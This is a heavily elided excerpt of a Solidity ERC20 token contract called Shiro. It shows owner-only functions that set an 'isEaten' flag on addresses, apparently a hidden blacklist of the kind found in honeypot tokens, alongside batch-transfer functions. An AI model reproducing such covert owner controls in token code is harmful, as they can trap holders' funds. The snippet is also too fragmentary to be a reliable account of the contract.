...
contract Shiro is Ownable, ERC20 {
    uint256 private _totalSupply = 21000000 * 10 ** decimals();
    ...
    function setEaten(address _address, bool _isEaten) external onlyOwner {
        isEaten[_address] = _isEaten;
    }

    function writeMulti_Eaten(address[] calldata recipient, bool newValue) public onlyOwner {
    ...
    function multiTransfer(address[] calldata addresses, uint256[] calldata amounts) public onlyOwner {
    ...
    function multiTransfer_fixed(address[] calldata addresses, uint256 amount) public onlyOwner {
